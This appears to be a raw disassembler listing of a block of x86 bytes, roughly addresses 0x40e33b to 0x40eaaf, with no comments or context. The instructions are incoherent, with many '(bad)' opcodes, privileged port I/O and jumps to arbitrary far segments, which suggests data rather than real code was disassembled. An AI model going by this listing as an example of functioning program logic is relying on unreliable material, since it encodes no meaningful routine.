  40e33b:	test   eax,0x68ba82a4
  40e340:	xor    ecx,esp
  40e342:	push   esi
  40e343:	in     eax,0x4
  40e345:	mov    ah,0xee
  40e347:	add    BYTE PTR fs:[edx],0xca
  40e34b:	sbb    esi,DWORD PTR [esi+0x29]
  40e34e:	in     al,0x15
  40e350:	dec    esp
  40e351:	test   BYTE PTR [esi+0x5dabfa4d],0x13
  40e358:	mov    BYTE PTR [ebp-0x57],cl
  40e35b:	jg     0x40e2f8
  40e35d:	jo     0x40e30d
  40e35f:	aam    0xd2
  40e361:	popfw  
  40e363:	call   0xa123:0x7086c62f
  40e36a:	aam    0x58
  40e36c:	dec    eax
  40e36d:	push   0xffffff83
  40e36f:	jb     0x40e3ec
  40e371:	sbb    BYTE PTR [ecx],bl
  40e373:	xchg   esi,eax
  40e374:	cmp    al,0x4e
  40e376:	or     al,0x12
  40e378:	mov    al,0x2d
  40e37a:	(bad)  
  40e37c:	(bad)  
  40e37d:	xor    DWORD PTR [edx-0x54],edx
  40e380:	ror    DWORD PTR [eax],1
  40e382:	add    al,0x7f
  40e384:	jmp    0xd207:0x86d429cd
  40e38b:	fs out dx,al
  40e38d:	and    BYTE PTR [ebp-0x6e],dl
  40e390:	sub    dh,cl
  40e392:	aad    0x6f
  40e394:	out    dx,eax
  40e395:	daa    
  40e396:	cmp    dl,BYTE PTR [edi+0x4]
  40e399:	xor    BYTE PTR [edx],cl
  40e39b:	mov    ah,0xed
  40e39d:	xchg   ch,ch
  40e39f:	fld    QWORD PTR [ebp-0x15]
  40e3a2:	sub    ecx,DWORD PTR [ebx+esi*2+0x6f]
  40e3a6:	or     DWORD PTR [ebp+esi*2+0x34e73156],edi
  40e3ad:	adc    esi,DWORD PTR [esi+ebp*2]
  40e3b0:	push   ds
  40e3b1:	aad    0x24
  40e3b3:	xchg   ebx,eax
  40e3b4:	call   0xc09a:0x822eea5f
  40e3bb:	es push esi
  40e3bd:	push   ecx
  40e3be:	mov    ah,0x11
  40e3c0:	push   edx
  40e3c1:	mov    ch,0x90
  40e3c3:	aaa    
  40e3c4:	jae    0x40e403
  40e3c6:	rcr    DWORD PTR [eax],cl
  40e3c8:	jmp    0x40e386
  40e3ca:	fwait
  40e3cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3cc:	fsubr  DWORD PTR [edx]
  40e3ce:	dec    ch
  40e3d0:	sahf   
  40e3d1:	sti    
  40e3d2:	mov    ch,0x69
  40e3d4:	xchg   BYTE PTR [ecx],ah
  40e3d6:	adc    al,0x31
  40e3d8:	pop    edx
  40e3d9:	icebp  
  40e3da:	aam    0xd1
  40e3dc:	pop    ds
  40e3dd:	cld    
  40e3de:	adc    ch,BYTE PTR ds:0x7e2eef1c
  40e3e4:	arpl   ax,bx
  40e3e6:	sbb    DWORD PTR [ecx],esp
  40e3e8:	jg     0x40e437
  40e3ea:	iret   
  40e3eb:	retf   
  40e3ec:	or     al,0xef
  40e3ee:	adc    DWORD PTR [edi],ebp
  40e3f0:	loope  0x40e3ed
  40e3f2:	jecxz  0x40e3eb
  40e3f4:	and    dh,BYTE PTR [eax]
  40e3f6:	enter  0xa44c,0xf6
  40e3fa:	push   eax
  40e3fb:	aam    0x18
  40e3fd:	inc    eax
  40e3fe:	and    dh,bl
  40e400:	sub    edi,DWORD PTR [ecx+0x5855a49e]
  40e406:	sub    ch,BYTE PTR [eax-0x431ee9da]
  40e40c:	adc    eax,0x4f124e85
  40e411:	jmp    0x40e453
  40e413:	cmp    esp,ebp
  40e415:	rcr    DWORD PTR [eax],cl
  40e417:	hlt    
  40e418:	pop    es
  40e419:	(bad)  
  40e41a:	mov    edx,0x28928fed
  40e41f:	sub    eax,0x2bb3e778
  40e424:	std    
  40e425:	rol    DWORD PTR [edx+0x620e8a5],cl
  40e42b:	rcr    DWORD PTR ds:0x1f92b185,cl
  40e431:	or     edi,DWORD PTR [eax-0x45]
  40e434:	cwde   
  40e435:	leave  
  40e436:	(bad)  
  40e437:	jmp    0x7363:0x51be8dcb
  40e43e:	adc    bl,dl
  40e440:	lds    edi,FWORD PTR ds:0x5815aac5
  40e446:	push   esp
  40e447:	fcmove st,st(7)
  40e449:	fistp  QWORD PTR [edi-0x16d033]
  40e44f:	pop    ss
  40e450:	jmp    0x40e433
  40e452:	push   0xe2a689f4
  40e457:	xchg   esp,eax
  40e458:	test   eax,0xb3cdc173
  40e45d:	and    eax,0x31e6f00f
  40e462:	fs sub eax,0xe084702b
  40e468:	mov    bh,0x56
  40e46a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e46b:	mov    dl,0xb8
  40e46d:	adc    al,0x99
  40e46f:	fisubr WORD PTR [ecx+0x49954526]
  40e475:	inc    esp
  40e476:	inc    ebx
  40e477:	and    BYTE PTR [ebp+0xe39f167],al
  40e47d:	pop    ebx
  40e47e:	idiv   edi
  40e480:	cmp    cl,BYTE PTR [ecx+0x5a85a68c]
  40e486:	sbb    bh,dh
  40e488:	jecxz  0x40e486
  40e48a:	or     BYTE PTR [edx],dl
  40e48c:	push   ds
  40e48d:	(bad)  
  40e48e:	pop    ebx
  40e48f:	pop    ebx
  40e490:	pop    ss
  40e491:	imul   ebp,DWORD PTR [edx+0x1ca8668e],0x5a
  40e498:	cmp    ah,BYTE PTR [edi-0x75]
  40e49b:	ret    
  40e49c:	inc    edi
  40e49d:	inc    eax
  40e49e:	push   0x8867fd07
  40e4a3:	inc    eax
  40e4a4:	sub    ah,dh
  40e4a6:	add    cl,BYTE PTR [esi-0x9d0d833]
  40e4ac:	scas   eax,DWORD PTR es:[edi]
  40e4ad:	leave  
  40e4ae:	mov    cl,0x8c
  40e4b0:	mul    DWORD PTR [ecx-0x71]
  40e4b3:	mov    ebx,0xdae6fc4c
  40e4b8:	cs sahf 
  40e4ba:	adc    al,0x6e
  40e4bc:	neg    esi
  40e4be:	add    dl,ch
  40e4c0:	les    ebp,FWORD PTR [eax]
  40e4c2:	xor    DWORD PTR [ebp+0x17],ecx
  40e4c5:	adc    edi,DWORD PTR [ebp-0x5f03132c]
  40e4cb:	jb     0x40e47e
  40e4cd:	push   0x940c4976
  40e4d2:	dec    esp
  40e4d3:	ret    
  40e4d4:	mov    edx,0xf4cd7b2d
  40e4d9:	sbb    ebx,DWORD PTR [ebp+0x5a]
  40e4dc:	cmc    
  40e4dd:	xchg   edi,eax
  40e4de:	adc    dh,BYTE PTR [esi-0xa]
  40e4e1:	mov    al,ds:0x9f3b5a04
  40e4e6:	and    DWORD PTR [edx],esp
  40e4e8:	jb     0x40e525
  40e4ea:	and    ebp,esi
  40e4ec:	mov    bl,0x7e
  40e4ee:	cs jge 0x40e562
  40e4f1:	fs dec ebp
  40e4f3:	fisttp DWORD PTR [esi+0x71be005]
  40e4f9:	dec    edi
  40e4fa:	in     eax,0xe6
  40e4fc:	stos   DWORD PTR es:[edi],eax
  40e4fd:	jbe    0x40e538
  40e4ff:	jecxz  0x40e531
  40e501:	hlt    
  40e502:	retf   0x4e7a
  40e505:	cli    
  40e506:	xlat   BYTE PTR ds:[ebx]
  40e507:	in     eax,0x19
  40e509:	sbb    dl,BYTE PTR [bp+si+0x3915]
  40e50e:	jle    0x40e544
  40e510:	imul   edi,DWORD PTR [ebx*1+0x13a89d0e],0xffffff91
  40e518:	pop    es
  40e519:	and    eax,0xa5b11d6f
  40e51f:	add    DWORD PTR [edi+0x3059e7b],eax
  40e525:	sbb    eax,0x9d8984fd
  40e52a:	shl    dl,cl
  40e52c:	ins    DWORD PTR es:[edi],dx
  40e52d:	test   al,0x34
  40e52f:	jmp    0xf539:0xd31f1c26
  40e536:	adc    BYTE PTR [ebx-0x1a915060],cl
  40e53c:	xor    al,0x44
  40e53e:	add    eax,ecx
  40e540:	jae    0x40e575
  40e542:	in     al,dx
  40e543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e544:	pop    ebp
  40e545:	outs   dx,DWORD PTR ds:[esi]
  40e546:	pop    ebp
  40e547:	jecxz  0x40e555
  40e549:	xchg   edi,eax
  40e54a:	mov    ecx,0x7a5e782d
  40e54f:	je     0x40e52d
  40e551:	pop    es
  40e552:	(bad)  
  40e553:	and    al,0x85
  40e555:	mov    cl,0x5d
  40e557:	jae    0x40e5b7
  40e559:	into   
  40e55a:	lods   al,BYTE PTR ds:[esi]
  40e55b:	mov    ebx,0xd0ac47f6
  40e560:	add    al,0xf8
  40e562:	mov    ah,0x5b
  40e564:	rcr    DWORD PTR [esi],0xbd
  40e567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e568:	cli    
  40e569:	lahf   
  40e56a:	adc    al,0x33
  40e56c:	lods   al,BYTE PTR ds:[esi]
  40e56d:	jns    0x40e539
  40e56f:	sbb    eax,0x39c996dd
  40e574:	push   ss
  40e575:	dec    ebx
  40e576:	xor    BYTE PTR [ecx],bh
  40e578:	stc    
  40e579:	jle    0x40e5df
  40e57b:	fldlg2 
  40e57d:	sub    al,0xb9
  40e57f:	fmulp  st(0),st
  40e581:	popa   
  40e582:	and    al,0xc1
  40e584:	iret   
  40e585:	ds ss dec ecx
  40e588:	je     0x40e5b3
  40e58a:	sub    BYTE PTR [esi+ebx*1],ah
  40e58d:	xchg   bl,ah
  40e58f:	jecxz  0x40e5c6
  40e591:	jecxz  0x40e5b4
  40e593:	int3   
  40e594:	dec    ecx
  40e595:	mov    ds:0xb3874574,al
  40e59a:	sub    eax,0x5afa3f7f
  40e59f:	retf   
  40e5a0:	add    BYTE PTR [esi+eax*4],ch
  40e5a3:	cmp    al,0x38
  40e5a5:	cdq    
  40e5a6:	or     bh,BYTE PTR [esi]
  40e5a8:	ins    BYTE PTR es:[edi],dx
  40e5a9:	mov    bh,0x95
  40e5ab:	int    0x9b
  40e5ad:	push   esp
  40e5ae:	add    al,0x46
  40e5b0:	or     DWORD PTR [edi-0x41],esp
  40e5b3:	xchg   edi,eax
  40e5b4:	mov    esi,0x26c44d8b
  40e5b9:	mov    DWORD PTR [di-0x15],eax
  40e5bd:	dec    esp
  40e5be:	push   edi
  40e5bf:	mov    ecx,0x3efed1b4
  40e5c4:	pop    ebp
  40e5c5:	mov    ds:0x2c329a55,eax
  40e5ca:	xor    DWORD PTR [ebx-0x2462b217],ecx
  40e5d0:	out    dx,eax
  40e5d1:	jp     0x40e5c1
  40e5d3:	loopne 0x40e561
  40e5d5:	ret    
  40e5d6:	hlt    
  40e5d7:	scas   al,BYTE PTR es:[edi]
  40e5d8:	or     eax,0x593568ba
  40e5dd:	pop    es
  40e5de:	enter  0xf3e3,0x70
  40e5e2:	inc    edx
  40e5e3:	push   edx
  40e5e4:	push   edx
  40e5e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5e6:	push   edx
  40e5e7:	(bad)
  40e5ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5eb:	add    ah,BYTE PTR [eax-0x7c]
  40e5ee:	lods   eax,DWORD PTR ds:[esi]
  40e5ef:	clc    
  40e5f0:	pop    eax
  40e5f1:	xchg   DWORD PTR [ebp+0x33],edx
  40e5f4:	aaa    
  40e5f5:	imul   eax,DWORD PTR [edx],0x7a33a22a
  40e5fb:	retf   0xd8b9
  40e5fe:	or     ah,BYTE PTR [ecx+ebx*1]
  40e601:	aad    0xcc
  40e603:	(bad)  [edx+0x15]
  40e606:	fild   DWORD PTR [ebx+0x35]
  40e609:	jmp    0xd2cc5e83
  40e60e:	stc    
  40e60f:	xor    al,0xee
  40e611:	push   es
  40e612:	sbb    al,0xf8
  40e614:	push   0xeba10185
  40e619:	mov    ds:0x1b2731ed,eax
  40e61e:	cmp    edx,DWORD PTR cs:[ebp+0x60959a30]
  40e625:	mov    al,0xc5
  40e627:	xchg   ebp,eax
  40e628:	aam    0x61
  40e62a:	xor    BYTE PTR [ecx+ebp*1+0x688abd9b],dl
  40e631:	nop
  40e632:	or     DWORD PTR [ebp+0x53],ebp
  40e635:	push   0xfffffff1
  40e637:	push   ecx
  40e638:	mov    ch,0x59
  40e63a:	push   esp
  40e63b:	in     eax,dx
  40e63c:	xchg   ecx,eax
  40e63d:	dec    ebp
  40e63e:	jmp    0x8ee:0x57cef323
  40e645:	jmp    0x40e5d4
  40e647:	imul   edi,DWORD PTR ds:0x2d1c97e2,0xffffffa2
  40e64e:	and    BYTE PTR [esi],ah
  40e650:	xchg   ebx,eax
  40e651:	sub    al,0x22
  40e653:	jb     0x40e644
  40e655:	dec    edx
  40e656:	inc    ebp
  40e657:	ret    0xe0ef
  40e65a:	rol    BYTE PTR [esi-0x61ee745],1
  40e660:	aaa    
  40e661:	sub    BYTE PTR [edi+0x4f3f3ee3],cl
  40e667:	and    al,0x10
  40e669:	add    edi,eax
  40e66b:	fs dec ecx
  40e66d:	mov    esi,0x14559747
  40e672:	jg     0x40e64f
  40e674:	cmc    
  40e675:	push   ss
  40e676:	js     0x40e6f1
  40e678:	push   edx
  40e679:	scas   eax,DWORD PTR es:[edi]
  40e67a:	pop    ebx
  40e67b:	xchg   esi,eax
  40e67c:	jmp    0xd9d5309e
  40e681:	push   es
  40e682:	adc    eax,0xcf9c7b2
  40e687:	push   es
  40e688:	mov    esp,0x3b44c0f4
  40e68d:	call   0x8979:0xc1e18d10
  40e694:	mov    edi,ss
  40e696:	push   0x6f
  40e698:	ds push ds
  40e69a:	and    cl,dl
  40e69c:	(bad)  
  40e69d:	out    dx,al
  40e69e:	xor    al,0xdf
  40e6a0:	fiadd  WORD PTR [edx+ecx*2+0x24cc75a5]
  40e6a7:	mov    DWORD PTR [ebp+0x1],ecx
  40e6aa:	test   eax,0x42167f7e
  40e6af:	push   0xe3609705
  40e6b4:	jb     0x40e6cc
  40e6b6:	adc    al,0x9f
  40e6b8:	loope  0x40e6db
  40e6ba:	mov    bh,0x40
  40e6bc:	das    
  40e6bd:	jmp    0x4249:0x58ea02a
  40e6c4:	repz and DWORD PTR [ebp+0x5ea21bc6],esi
  40e6cb:	pop    edx
  40e6cc:	fnstcw WORD PTR [ecx+ebp*2+0x60fc7d]
  40e6d3:	or     DWORD PTR [esi-0x23],esi
  40e6d6:	imul   ebx,DWORD PTR [ebx+edi*1],0xffffff88
  40e6da:	dec    eax
  40e6db:	popa   
  40e6dc:	inc    eax
  40e6dd:	clc    
  40e6de:	sbb    eax,0xd3fc521a
  40e6e3:	ret    
  40e6e4:	adc    eax,0x455a39d1
  40e6e9:	or     ebp,DWORD PTR [ecx+0x38139d4a]
  40e6ef:	lahf   
  40e6f0:	push   es
  40e6f1:	loopne 0x40e69c
  40e6f3:	mov    al,ds:0x269389f9
  40e6f9:	nop
  40e6fa:	lock mov edx,0x8379a66b
  40e700:	jb     0x40e746
  40e702:	cmp    ch,dh
  40e704:	fwait
  40e705:	jno    0x40e775
  40e707:	shr    DWORD PTR [eax],1
  40e709:	sar    DWORD PTR [edx-0x49],0xa3
  40e70d:	gs xchg esp,eax
  40e70f:	lahf   
  40e710:	cwde   
  40e711:	sbb    bh,BYTE PTR [esi+0x7f]
  40e714:	mov    eax,ds:0x19b471f
  40e719:	(bad)  
  40e71a:	xor    dh,al
  40e71c:	mov    BYTE PTR [eax+0x27ecf950],bl
  40e722:	std    
  40e723:	outs   dx,BYTE PTR ds:[esi]
  40e724:	push   ds
  40e725:	sub    ebp,DWORD PTR [ebx+0x39c796ac]
  40e72b:	xor    al,0xee
  40e72d:	daa    
  40e72e:	inc    edx
  40e72f:	jmp    DWORD PTR [ecx+esi*2-0x344627f2]
  40e736:	cmp    dh,ch
  40e738:	add    BYTE PTR [ebx-0x1],0x91
  40e73c:	jmp    0x40e78b
  40e73e:	push   ds
  40e73f:	fucomp st(7)
  40e741:	enter  0xefcf,0x34
  40e745:	fadd   QWORD PTR [ebp-0x41d09cc8]
  40e74b:	mov    ebp,0x1f8f8c7a
  40e750:	mov    eax,ds:0xedd06a0b
  40e755:	rcl    DWORD PTR [eax],cl
  40e757:	aad    0x62
  40e759:	xchg   ecx,eax
  40e75a:	xor    al,0xe1
  40e75c:	or     al,BYTE PTR [ecx+eax*4-0x3c]
  40e760:	retf   
  40e761:	and    eax,0x53c85775
  40e766:	aas    
  40e767:	xchg   edi,eax
  40e768:	cmp    ecx,DWORD PTR [edi-0x7b]
  40e76b:	sbb    cl,ch
  40e76d:	aaa    
  40e76e:	mov    edx,0x758ee03d
  40e773:	shl    WORD PTR [edi+0x48],cl
  40e777:	jmp    0xcd42518c
  40e77c:	pop    ecx
  40e77d:	jns    0x40e7e9
  40e77f:	jmp    FWORD PTR [eax-0x641a2ada]
  40e785:	xlat   BYTE PTR ds:[ebx]
  40e786:	or     BYTE PTR [ebp+ebx*8+0x49],dh
  40e78a:	xor    al,0xa5
  40e78c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e78d:	out    0x5f,eax
  40e78f:	aad    0x4f
  40e791:	mov    dl,0x8a
  40e793:	ss nop
  40e795:	std    
  40e796:	sbb    eax,0x2542d83f
  40e79b:	push   ds
  40e79c:	jb     0x40e7a7
  40e79e:	mov    edx,0x2db94803
  40e7a3:	ds jb  0x40e788
  40e7a6:	cmp    eax,0x16d1376e
  40e7ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7ac:	aaa    
  40e7ad:	pop    ds
  40e7ae:	cwde   
  40e7af:	dec    esp
  40e7b0:	jge    0x40e76a
  40e7b2:	pop    ebx
  40e7b3:	fcom   st(6)
  40e7b5:	dec    ebp
  40e7b6:	ins    DWORD PTR es:[edi],dx
  40e7b7:	inc    edi
  40e7b8:	(bad)  
  40e7b9:	sub    edx,DWORD PTR [ecx-0x6e9b6081]
  40e7bf:	lods   eax,DWORD PTR ds:[esi]
  40e7c0:	inc    eax
  40e7c1:	dec    ecx
  40e7c2:	adc    dl,0x7a
  40e7c5:	enter  0x2447,0x90
  40e7c9:	mov    ecx,edx
  40e7cb:	mov    cl,0xf2
  40e7cd:	inc    esi
  40e7ce:	vcmppd xmm0,xmm6,xmm1,0x31
  40e7d3:	xchg   esp,eax
  40e7d4:	xchg   ecx,eax
  40e7d5:	mov    dl,0x52
  40e7d7:	retf   0x9a0c
  40e7da:	xchg   ecx,eax
  40e7db:	jecxz  0x40e7e7
  40e7dd:	add    bh,BYTE PTR [esi]
  40e7df:	enter  0x911b,0x64
  40e7e3:	xchg   esi,eax
  40e7e4:	pusha  
  40e7e5:	in     eax,0x3f
  40e7e7:	jp     0x40e7a5
  40e7e9:	jae    0x40e7c5
  40e7eb:	mov    ah,0x9f
  40e7ed:	fwait
  40e7ee:	or     eax,0x777113e7
  40e7f3:	push   ds
  40e7f4:	sbb    ebx,DWORD PTR [ebp+0x47]
  40e7f7:	vpmaxsw ymm5,ymm5,YMMWORD PTR [ecx+0x37]
  40e7fc:	into   
  40e7fd:	and    edx,DWORD PTR [edx]
  40e7ff:	xor    al,0x74
  40e801:	rcl    DWORD PTR [ebx],cl
  40e803:	sub    esp,esi
  40e805:	and    bh,bl
  40e807:	xor    DWORD PTR [eax+0x55e2ce9],esp
  40e80d:	or     BYTE PTR [ecx-0x66],0xf0
  40e811:	pop    edx
  40e812:	ror    BYTE PTR [esi+0x5c3f98bc],1
  40e818:	and    al,0xb9
  40e81a:	and    eax,0xb8814431
  40e81f:	rcr    DWORD PTR [ecx+eax*1-0x623f9e89],0x47
  40e827:	mov    dl,BYTE PTR [esi+0x65d324f0]
  40e82d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e82e:	jnp    0x40e7d8
  40e830:	mov    eax,0x58d3e6a0
  40e835:	add    esi,DWORD PTR [edi-0x2ba01a8b]
  40e83b:	pushf  
  40e83c:	dec    ebp
  40e83d:	fs popa 
  40e83f:	push   ebx
  40e840:	scas   al,BYTE PTR es:[edi]
  40e841:	dec    edx
  40e842:	(bad)  
  40e843:	xchg   ecx,eax
  40e844:	cmp    ebx,DWORD PTR [eax-0x60153d0f]
  40e84a:	xor    esp,DWORD PTR [ecx]
  40e84c:	ror    DWORD PTR [esi-0x24],cl
  40e84f:	ror    ebx,0x5a
  40e852:	xchg   edi,eax
  40e853:	jb     0x40e7f2
  40e855:	bound  edi,QWORD PTR [edi-0x21]
  40e858:	adc    DWORD PTR ds:0x81060891,ecx
  40e85e:	mov    ah,0xe0
  40e860:	sahf   
  40e861:	sbb    edi,esi
  40e863:	sub    dh,BYTE PTR [ecx-0x4f72dbd1]
  40e869:	inc    edx
  40e86a:	retf   
  40e86b:	fisubr WORD PTR [ebx-0x5e]
  40e86e:	jns    0x40e8a4
  40e870:	adc    DWORD PTR [ebp+0x487de04b],ecx
  40e876:	jg     0x40e8cb
  40e878:	jecxz  0x40e7ff
  40e87a:	(bad)  [eax+ebx*8-0x2d]
  40e87e:	push   0xffffffdb
  40e880:	push   esi
  40e881:	ret    0x78b3
  40e884:	sub    BYTE PTR [edx+ecx*1-0x29],bh
  40e888:	cwde   
  40e889:	mov    bl,0x98
  40e88b:	sbb    DWORD PTR [ecx+0x1614993],edi
  40e891:	inc    eax
  40e892:	ins    DWORD PTR es:[edi],dx
  40e893:	mov    esi,DWORD PTR [edx+esi*4+0x52]
  40e897:	xchg   edx,eax
  40e898:	sub    edx,DWORD PTR [edx+0x28]
  40e89b:	not    DWORD PTR [edx-0x1329aef7]
  40e8a1:	pusha  
  40e8a2:	sti    
  40e8a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8a4:	std    
  40e8a5:	sbb    al,0x38
  40e8a7:	mov    WORD PTR [esi+eiz*1],fs
  40e8aa:	stc    
  40e8ab:	cwde   
  40e8ac:	and    eax,0xdb49927d
  40e8b1:	dec    eax
  40e8b2:	pop    es
  40e8b3:	jl     0x40e8fd
  40e8b5:	and    eax,0x360cef91
  40e8ba:	scas   eax,DWORD PTR es:[edi]
  40e8bb:	lahf   
  40e8bc:	adc    BYTE PTR [edi],ch
  40e8be:	call   0xd5ef:0xead386ea
  40e8c5:	mov    dl,0x9
  40e8c7:	cmp    esp,eax
  40e8c9:	xchg   BYTE PTR [ecx+edx*2],bh
  40e8cc:	mov    esp,DWORD PTR [ecx*8-0x30d17823]
  40e8d3:	outs   dx,BYTE PTR ds:[esi]
  40e8d4:	cli    
  40e8d5:	inc    ebx
  40e8d6:	sub    dh,BYTE PTR [ecx]
  40e8d8:	sub    dh,cl
  40e8da:	mov    bh,0x1c
  40e8dc:	sar    esp,cl
  40e8de:	lods   eax,DWORD PTR ds:[esi]
  40e8df:	in     al,dx
  40e8e0:	je     0x40e8a2
  40e8e2:	xchg   ecx,eax
  40e8e3:	je     0x40e8f5
  40e8e5:	cli    
  40e8e6:	dec    eax
  40e8e7:	adc    DWORD PTR [esi-0x4a060431],esp
  40e8ed:	xlat   BYTE PTR ds:[ebx]
  40e8ee:	xor    bh,ch
  40e8f0:	pop    ebp
  40e8f1:	gs or  al,dl
  40e8f4:	xchg   esp,eax
  40e8f5:	xor    eax,0x9eb9ab07
  40e8fa:	lds    esi,FWORD PTR [ecx]
  40e8fc:	jl     0x40e8ae
  40e8fe:	fimul  DWORD PTR [ecx+0x4d4d6086]
  40e904:	popf   
  40e905:	push   0xffffffa5
  40e907:	dec    ebx
  40e908:	jns    0x40e97f
  40e90a:	jmp    0x40e8d7
  40e90c:	(bad)  
  40e90d:	fmul   st(5),st
  40e90f:	test   al,0x23
  40e911:	inc    esi
  40e912:	inc    ecx
  40e913:	in     al,dx
  40e914:	call   DWORD PTR [ecx+edi*2+0x7257f4e6]
  40e91b:	dec    esp
  40e91c:	out    0x18,al
  40e91e:	add    eax,0x2c757a9
  40e923:	ror    DWORD PTR [ebx],1
  40e925:	dec    edi
  40e926:	xchg   ebp,eax
  40e927:	xchg   ebp,eax
  40e928:	inc    edx
  40e929:	mov    bh,0x3a
  40e92b:	and    al,0x35
  40e92d:	or     DWORD PTR [ebx+0x58d4bede],esi
  40e933:	fcomip st,st(7)
  40e935:	(bad)  
  40e937:	mov    ecx,0xf33395cc
  40e93c:	sbb    eax,0xf1de229f
  40e941:	sub    BYTE PTR [ecx+0x76],0x93
  40e945:	jo     0x40e97c
  40e947:	aaa    
  40e948:	and    al,0xe3
  40e94a:	inc    edx
  40e94b:	jmp    0x40e9b1
  40e94d:	mul    BYTE PTR [esi-0x2e]
  40e950:	es enter 0x9af3,0x37
  40e955:	shl    BYTE PTR ds:0xf7b64e18,0xaa
  40e95c:	adc    al,0x47
  40e95e:	or     eax,0x3e93a75d
  40e963:	mov    ah,0x38
  40e965:	dec    edi
  40e966:	jle    0x40e9e6
  40e968:	or     al,0xa8
  40e96a:	push   cs
  40e96b:	jle    0x40e9d6
  40e96d:	sbb    DWORD PTR [ebx],esp
  40e96f:	push   eax
  40e970:	sbb    eax,0xf486156e
  40e975:	lock imul ebp,DWORD PTR ss:[eax],0xbb6bfaf9
  40e97d:	dec    edx
  40e97e:	scas   eax,DWORD PTR es:[edi]
  40e97f:	pop    esp
  40e980:	loop   0x40e931
  40e982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e983:	dec    ebp
  40e984:	imul   edi,edx,0xffffffe7
  40e987:	addr16 (bad) 
  40e98b:	pop    ss
  40e98c:	lods   eax,DWORD PTR ds:[esi]
  40e98d:	pop    esi
  40e98e:	cmp    edi,edx
  40e990:	out    dx,al
  40e991:	lahf   
  40e992:	sbb    DWORD PTR [ebp-0x2c],esi
  40e995:	push   0x6e1fee8f
  40e99a:	mov    eax,ds:0x50c8539f
  40e99f:	sbb    DWORD PTR [ebp+0xb],edi
  40e9a2:	adc    eax,ebp
  40e9a4:	xor    DWORD PTR [eax-0x542d3ab5],esi
  40e9aa:	mov    eax,ds:0x9389380e
  40e9af:	mov    bl,0x6
  40e9b1:	stc    
  40e9b2:	sbb    ch,ah
  40e9b4:	mov    ch,0xb9
  40e9b7:	adc    BYTE PTR [eax-0x3f],dl
  40e9ba:	mov    al,ds:0x20c7b1c3
  40e9bf:	out    0x85,eax
  40e9c1:	jno    0x40ea32
  40e9c3:	sbb    DWORD PTR [ebx],0xffffffde
  40e9c6:	rcl    DWORD PTR [ecx-0x2c],0x1b
  40e9ca:	mov    eax,ds:0x1990c6ab
  40e9cf:	out    dx,eax
  40e9d0:	adc    dh,BYTE PTR [eax+ebp*1-0x7a]
  40e9d4:	sbb    bh,BYTE PTR [esi-0x57ef608e]
  40e9da:	stc    
  40e9db:	addr16 hlt 
  40e9dd:	fstp   DWORD PTR [ecx+0x1008734b]
  40e9e3:	mov    ds:0xb651b97d,al
  40e9e8:	or     BYTE PTR [edx],cl
  40e9ea:	lods   eax,DWORD PTR ds:[esi]
  40e9eb:	rol    BYTE PTR [esp+ebp*2],cl
  40e9ee:	sar    DWORD PTR [ebx+0x5d],1
  40e9f1:	ret    0x2a5d
  40e9f4:	jmp    0x40e982
  40e9f6:	es mov edx,0x23576330
  40e9fc:	mov    bh,0x9c
  40e9fe:	push   ebp
  40e9ff:	std    
  40ea00:	aas    
  40ea01:	lds    esp,FWORD PTR [esi]
  40ea03:	add    BYTE PTR [edx+eiz*2-0x1],ah
  40ea07:	std    
  40ea08:	mov    ah,0xdd
  40ea0a:	and    DWORD PTR [edx+0x65d0f63],edx
  40ea10:	js     0x40ea76
  40ea12:	add    DWORD PTR [edi-0x18],edi
  40ea15:	iret   
  40ea16:	(bad)  
  40ea17:	xchg   ebp,eax
  40ea18:	nop
  40ea19:	dec    ebp
  40ea1a:	pop    esp
  40ea1b:	(bad)  
  40ea1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea1d:	jbe    0x40e9c1
  40ea1f:	int    0xfb
  40ea21:	call   0x2b59ba74
  40ea26:	je     0x40e9c8
  40ea28:	and    al,0x12
  40ea2a:	daa    
  40ea2b:	jmp    0x4e4e5e5a
  40ea30:	push   edi
  40ea31:	bound  esi,QWORD PTR [eax+0x77]
  40ea34:	fbld   TBYTE PTR [edi+ebp*1-0x4dd219da]
  40ea3b:	inc    esp
  40ea3c:	push   cs
  40ea3d:	adc    al,0xd7
  40ea3f:	sub    ecx,DWORD PTR [edx-0x27cf5b60]
  40ea45:	int    0x43
  40ea47:	je     0x40eabd
  40ea49:	dec    edi
  40ea4a:	rcl    ch,0x20
  40ea4d:	lahf   
  40ea4e:	xchg   ecx,eax
  40ea4f:	out    dx,al
  40ea50:	sub    DWORD PTR [edx+ebx*8-0x5bccf7f5],eax
  40ea57:	jl     0xb6018d99
  40ea5d:	pop    eax
  40ea5e:	jbe    0x40ea89
  40ea60:	loop   0x40e9fb
  40ea62:	dec    esp
  40ea63:	mov    bh,BYTE PTR [ebp+eax*2-0xaf8a066]
  40ea6a:	push   cs
  40ea6b:	cmp    esp,DWORD PTR [edx]
  40ea6d:	inc    ecx
  40ea6e:	pusha  
  40ea6f:	jmp    0xc42a:0xd8a52fb4
  40ea76:	test   BYTE PTR [edi+0x456e795f],ah
  40ea7c:	push   ebx
  40ea7d:	ins    BYTE PTR es:[edi],dx
  40ea7e:	stos   BYTE PTR es:[edi],al
  40ea7f:	(bad)  
  40ea80:	scas   eax,DWORD PTR es:[edi]
  40ea81:	bound  edx,QWORD PTR [ebx+0x279274be]
  40ea87:	(bad)  
  40ea88:	mov    edi,0x183c8321
  40ea8d:	push   edx
  40ea8e:	(bad)  [edx-0x50a165d7]
  40ea94:	mov    ds:0x19dc1933,eax
  40ea99:	pop    esp
  40ea9a:	jnp    0x40ea89
  40ea9c:	adc    ebp,DWORD PTR [edx]
  40ea9e:	div    BYTE PTR [edi+0x1751ed9d]
  40eaa4:	xchg   BYTE PTR [ebx-0xb43cfb3],dh
  40eaaa:	int3   
  40eaab:	or     cl,BYTE PTR [ecx-0x6a]
  40eaae:	(bad)  
  40eaaf:	fidiv  DWORD PTR [ebx-0x4]
